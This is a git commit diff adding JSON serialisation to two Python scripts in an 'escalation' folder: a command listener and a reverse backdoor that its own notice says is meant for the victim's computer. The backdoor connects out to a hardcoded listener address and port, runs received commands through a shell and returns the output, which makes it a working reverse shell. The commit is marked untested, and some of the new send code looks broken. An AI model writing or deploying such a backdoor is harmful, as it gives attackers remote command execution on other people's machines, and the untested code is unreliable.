a6f9be7029c7f1affdc5806c5377d1c55300d537
Maffey <matiusz98@gmail.com>
2020-07-14 14:33:17 +0200

    implemented serialization, not yet tested

--- scripts/escalation/listener.py
+++ scripts/escalation/listener.py
@@ -2,28 +2,37 @@
 # NOTICE: This script is used as a listener for 'reverse_backdoor.py' script.
 # Compatibility: Python 3 only.
 
+import json
 import socket
 
 
 class Listener:
     def __init__(self, ip_address, port):
-        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        listener.bind((ip_address, port))
-        listener.listen(0)
+        listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener_socket.bind((ip_address, port))
+        listener_socket.listen(0)
         print("[+] Waiting for incoming connection...")
-        self.connection, address = listener.accept()
+        self.connection, address = listener_socket.accept()
         print(f"[+] Connection established! Source: {address}.")
+
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode(errors="replace"))
+
+    def reliable_receive(self):
+        json_data = self.connection.recv(1024).decode(errors="replace")
+        return json.loads(json_data)
+
+    def execute_remotely(self, command):
+        self.reliable_send(command.encode(errors="replace"))
+        return self.reliable_receive()
 
     def run(self):
         while True:
             command = input(" >> ")
             result = self.execute_remotely(command)
             print(result)
-
-    def execute_remotely(self, command):
-        self.connection.send(command.encode(errors="replace"))
-        return self.connection.recv(1024).decode(errors="replace")
 
 
 listener = Listener("10.0.2.15", 4444)
--- scripts/escalation/reverse_backdoor.py
+++ scripts/escalation/reverse_backdoor.py
@@ -2,6 +2,7 @@
 # NOTICE: this script is intended for the victim's computer.
 # Compatibility: Python 3 only.
 
+import json
 import socket
 import subprocess
 
@@ -11,15 +12,22 @@ class Backdoor:
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip_addr, port))
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode(errors="replace"))
+
+    def reliable_receive(self):
+        json_data = self.connection.recv(1024).decode(errors="replace")
+        return json.loads(json_data)
+
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
     def run(self):
         while True:
-            command_received = self.connection.recv(1024).decode(errors="replace")
-            command_result = self.execute_system_command(command_received)
-            self.connection.send(command_result)
-
+            command_received = self.reliable_receive()
+            command_result = self.execute_system_command(command_received)  # check if good
+            self.reliable_send(command_result)
         self.connection.close()
 
 
